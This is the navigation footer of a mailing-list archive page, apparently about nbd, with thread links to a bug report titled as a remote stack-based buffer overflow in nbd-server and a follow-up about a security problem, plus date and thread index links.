<li>Previous by thread:
<strong><a href="msg00036.html">[BUG] nbd-server: Remote stack-based buffer overflow</a></strong>
</li>
<li>Next by thread:
<strong><a href="msg00038.html">Re: report security problem of nbd</a></strong>
</li>
<li>Index(es):
<ul>
<li><a href="maillist.html#00037"><strong>Date</strong></a></li>
<li><a href="threads.html#00037"><strong>Thread</strong></a></li>
</ul>
</li>
</ul>

<!--X-BotPNI-End-->
<!--X-User-Footer-->
<!--X-User-Footer-End-->
</body>
</html>
